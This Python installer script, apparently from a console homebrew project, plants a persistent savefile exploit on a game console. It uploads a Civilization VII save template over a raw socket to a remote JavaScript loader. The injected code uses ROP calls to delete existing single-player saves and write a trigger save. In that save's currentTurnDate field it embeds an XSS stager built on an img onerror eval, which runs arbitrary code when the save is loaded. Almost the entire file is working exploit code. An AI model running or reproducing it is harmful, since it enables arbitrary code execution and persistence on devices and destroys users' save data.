#!/usr/bin/env python3
# IZ2S adaptation 2026-11-08: persistent trigger name is IZ2S.Civ7Save.
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Gezine. See LICENSES/Gezine-MIT.txt.
# Source: https://github.com/Gezine/CivSwitch/blob/3238a3e3340fd19a9dbd5cde56f3b50f9bc5d97f/installer-creator/install.py
"""install.py - one-shot CIV7 savefile-XSS installer.

Builds the installer in a temp directory and sends it to the console's
Remote JS Loader automatically: compresses the payload, splices it into
the bundled save template, uploads the template as chunked connections,
then writes the persistent IZ2S.Civ7Save trigger (cleaning up any
previously installed trigger files first).

Usage:
  python install.py <console-ip> [port] [payload.js]

  <console-ip>   required
  [port]         optional, default 9026
  [payload.js]   optional, default ../payloads/core.js
                 (the shipped default is the Remote JS Loader: after
                 reboot, Load Game brings the loader up on this port)

Needs: node + terser (npm install at the repository root),
and the Remote JS Loader already running on the console (Pico bootstrap
or a previously installed trigger).
"""
import base64, io, json, os, shutil, socket, subprocess, sys, tempfile, time

HERE = os.path.dirname(os.path.abspath(__file__))
CHUNK = 400000   # b64 chars per loader connection (< 500KB payload limit)

STAGER = ('<img src=x onerror="eval(document.body.textContent'
          ".match(/XSSP:[0-9]+:[0-9a-f]+/g)"
          ".map(x=>x.split(':')[2])"
          ".join('')"
          '.replace(/../g,x=>String.fromCharCode(parseInt(x,16))))">')
assert '{' not in STAGER and '}' not in STAGER

BLOCK = r"""
(async function() {
try {

// ==== savefile-XSS installer (template uploaded from PC) ====
const F_CreateFile  = sdk_base + 0xa6700n;
const F_OpenFile    = sdk_base + 0xa78a0n;
const F_CloseFile   = sdk_base + 0xa5a70n;
const F_WriteFile   = sdk_base + 0xa5e00n;
const F_SetFileSize = sdk_base + 0xa6020n;
const F_Commit      = sdk_base + 0xa7de0n;
const F_DeleteFile  = sdk_base + 0xa6710n;
const F_CreateDir   = sdk_base + 0xa6890n;
const F_OpenDir     = sdk_base + 0xa7bb0n;
const F_ReadDir     = sdk_base + 0xa5840n;
const F_CloseDir    = sdk_base + 0xa57b0n;

const STAGER = __STAGER__;
const STAGE_HEX = __STAGE_HEX__;
const TPL_B64_LEN = __TPL_B64_LEN__;

const sfx_h = malloc(8), sfx_sz = malloc(8);
const sfx_wo = malloc(8); write32(sfx_wo, 1n);
const sfx_dh = malloc(8), sfx_dn = malloc(8);
const sfx_pb = malloc(4096);
const sfx_dirbuf = malloc(0x310 * 32);

function sfx_writePath(bytes) {
    for (let i = 0; i < bytes.length; i++) write8(sfx_pb + BigInt(i), BigInt(bytes[i]));
    write8(sfx_pb + BigInt(bytes.length), 0n);
}
function sfx_listDir(path) {
    sfx_writePath(text_encode(path));
    if (call_rop(F_OpenDir, sfx_dh, sfx_pb, 3n) !== 0n) return null;
    const out = [];
    for (;;) {
        call_rop(F_ReadDir, sfx_dn, sfx_dirbuf, read64(sfx_dh), 32n);
        const n = Number(read64(sfx_dn));
        if (n <= 0) break;
        for (let i = 0; i < n; i++) {
            const e = sfx_dirbuf + BigInt(i * 0x310);
            let nm = "";
            for (let k = 0; k < 0x300; k++) {
                const c = Number(read8(e + BigInt(k)));
                if (!c) break;
                nm += String.fromCharCode(c);
            }
            out.push({ name: nm, type: Number(read32(e + 0x304n) & 0xffn) });
        }
        if (n < 32 || out.length >= 512) break;
    }
    call_rop(F_CloseDir, read64(sfx_dh));
    return out;
}
function sfx_b64dec(s) {
    const A = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    const m = {};
    for (let i = 0; i < 64; i++) m[A[i]] = i;
    const out = [];
    let i = 0;
    while (i + 3 < s.length) {
        const c0 = m[s[i]], c1 = m[s[i+1]];
        const p2 = s[i+2] === "=", p3 = s[i+3] === "=";
        const c2 = p2 ? 0 : m[s[i+2]];
        const c3 = p3 ? 0 : m[s[i+3]];
        const v = (c0 << 18) | (c1 << 12) | (c2 << 6) | c3;
        out.push((v >> 16) & 255);
        if (!p2) out.push((v >> 8) & 255);
        if (!p2 && !p3) out.push(v & 255);
        i += 4;
    }
    return out;
}

const tplB64 = (window.__tpl || []).join("");
if (tplB64.length !== TPL_B64_LEN) {
    await log("E: template upload incomplete - run install.py again");
    return;
}
window.__tpl = null;

const tpl = sfx_b64dec(tplB64);
if (tpl[0] !== 0x43 || tpl[1] !== 0x49 || tpl[2] !== 0x56 || tpl[3] !== 0x37) {
    await log("E: template bad magic");
    return;
}

const sub = sfx_listDir("save:/saves/Single/");
if (sub) {
    for (let j = 0; j < sub.length; j++) {
        if (sub[j].type !== 1) continue;
        const nm = sub[j].name;
        sfx_writePath(text_encode("save:/saves/Single/" + nm));
        call_rop(F_DeleteFile, sfx_pb);
    }
}

// find the currentTurnDate record by its field hash (FE5A61E8):
// [u32 hash][u64 tag][u32 framing 0x60000000|len+1][u32 flag][value][NUL]
let HPOS = -1;
for (let i = 0; i + 28 < tpl.length; i++) {
    if (tpl[i] !== 0xfe || tpl[i+1] !== 0x5a || tpl[i+2] !== 0x61 || tpl[i+3] !== 0xe8) continue;
    const f = (tpl[i+12] | (tpl[i+13] << 8) | (tpl[i+14] << 16) | (tpl[i+15] << 24)) >>> 0;
    const flag = (tpl[i+16] | (tpl[i+17] << 8) | (tpl[i+18] << 16) | (tpl[i+19] << 24)) >>> 0;
    if ((f & 0xe0000000) === 0x60000000 && flag === 1) { HPOS = i; break; }
}
if (HPOS < 0) { await log("E: currentTurnDate record not found"); return; }
const OLD_LEN = (((tpl[HPOS+12] | (tpl[HPOS+13] << 8) | (tpl[HPOS+14] << 16) | (tpl[HPOS+15] << 24)) >>> 0) & 0x1fffffff) - 1;
let oldVal = "";
for (let k = 0; k < OLD_LEN; k++) oldVal += String.fromCharCode(tpl[HPOS + 20 + k]);
if (oldVal !== "4000 BCE") { await log("E: unexpected record value"); return; }

const NEWVAL = STAGER + "XSSP:0:" + STAGE_HEX;
const VAL_OFF = HPOS + 20;
const TAIL_OFF = VAL_OFF + OLD_LEN + 1;
const newSize = tpl.length + NEWVAL.length - OLD_LEN;
const out = malloc(newSize + 32);
let w = 0;
for (; w + 3 < VAL_OFF - 8; w += 4)
    write32(out + BigInt(w), BigInt(tpl[w] | (tpl[w+1] << 8) | (tpl[w+2] << 16) | (tpl[w+3] << 24)) & 0xffffffffn);
for (; w < VAL_OFF - 8; w++) write8(out + BigInt(w), BigInt(tpl[w]));
write32(out + BigInt(VAL_OFF - 8), BigInt(0x60000000 | (NEWVAL.length + 1)) & 0xffffffffn);
write32(out + BigInt(VAL_OFF - 4), 1n);
for (let k = 0; k < NEWVAL.length; k++) write8(out + BigInt(VAL_OFF + k), BigInt(NEWVAL.charCodeAt(k) & 0xff));
write8(out + BigInt(VAL_OFF + NEWVAL.length), 0n);
for (let k = TAIL_OFF; k < tpl.length; k++) write8(out + BigInt(k + (newSize - tpl.length)), BigInt(tpl[k]));

// ensure Single/ exists (bare console), write, commit
sfx_writePath(text_encode("save:/saves/Single"));
call_rop(F_CreateDir, sfx_pb);

sfx_writePath(text_encode("save:/saves/Single/IZ2S.Civ7Save"));
call_rop(F_CreateFile, sfx_pb, BigInt(newSize));
const r2 = call_rop(F_OpenFile, sfx_h, sfx_pb, 6n);
if (r2 !== 0n) { await log("E: open XSTRIG " + toHex(r2)); return; }
call_rop(F_SetFileSize, read64(sfx_h), BigInt(newSize));
const r4 = call_rop(F_WriteFile, read64(sfx_h), 0n, out, BigInt(newSize), sfx_wo);
call_rop(F_CloseFile, read64(sfx_h));
if (r4 !== 0n) { await log("E: write " + toHex(r4)); return; }

sfx_writePath(text_encode("save"));
const cr = call_rop(F_Commit, sfx_pb);
if (cr !== 0n) { await log("E: commit " + toHex(cr)); return; }
await log("INSTALL DONE - reboot, Load Game");

} catch (e) {
await log('EXCEPTION: ' + e.message);
await log(e.stack);
}
})();
"""


def send(host, port, code, timeout=300):
    s = socket.create_connection((host, port), timeout=8)
    s.sendall(code.encode())
    s.shutdown(socket.SHUT_WR)
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            data += c
    except socket.timeout:
        pass
    s.close()
    return data.decode("utf-8", "replace")


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9026
    payload_path = sys.argv[3] if len(sys.argv) > 3 else os.path.join(HERE, "..", "payloads", "core.js")

    tmp = tempfile.mkdtemp(prefix="civ7inst_")
    try:
        # 1. wrap + compress the payload (offline round-trip check)
        core = io.open(payload_path, encoding="utf-8").read().replace("\r\n", "\n")
        wrapped = ("(async function() {\ntry{\n" + core +
                   "\n} catch (e) {\nawait log('EXCEPTION: ' + e.message);\nawait log(e.stack);\n}\n})();")
        wrapped_path = os.path.join(tmp, "wrapped.js")
        io.open(wrapped_path, "w", encoding="utf-8", newline="\n").write(wrapped)
        hex_path = os.path.join(tmp, "stage.hex")
        r = subprocess.run(["node", os.path.join(HERE, "compress_stage.js"),
                            wrapped_path, hex_path],
                           capture_output=True, text=True)
        print(r.stdout.strip())
        if r.returncode != 0:
            print(r.stderr)
            sys.exit(2)
        stage_hex = io.open(hex_path, encoding="utf-8").read().strip()

        # 2. template + apply payload
        tpl = open(os.path.join(HERE, "save_template.bin"), "rb").read()
        if len(tpl) < 4096 or tpl[:4] != b"CIV7":
            print("E: bad save_template.bin")
            sys.exit(3)
        tpl_b64 = base64.b64encode(tpl).decode()
        apply_js = (BLOCK
                    .replace("__STAGER__", json.dumps(STAGER))
                    .replace("__STAGE_HEX__", json.dumps(stage_hex))
                    .replace("__TPL_B64_LEN__", str(len(tpl_b64))))

        # 3. upload template chunks, then apply
        print(send(host, port, "log('STARTING INSTALLER');window.__tpl=null;'reset'").strip())
        n = (len(tpl_b64) + CHUNK - 1) // CHUNK
        t0 = time.time()
        for i in range(n):
            part = tpl_b64[i * CHUNK:(i + 1) * CHUNK]
            out = send(host, port,
                       "(window.__tpl=window.__tpl||[]).push('%s');"
                       "'chunk %d/%d'" % (part, i + 1, n))
            if "Executed" not in out:
                print("chunk %d/%d FAILED: %s" % (i + 1, n, out.strip()[:200]))
        print("template: %d chunks, %.0fs" % (n, time.time() - t0))
        out = send(host, port, apply_js)
        print(out)
        sys.exit(0 if "INSTALL DONE" in out else 1)
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    main()
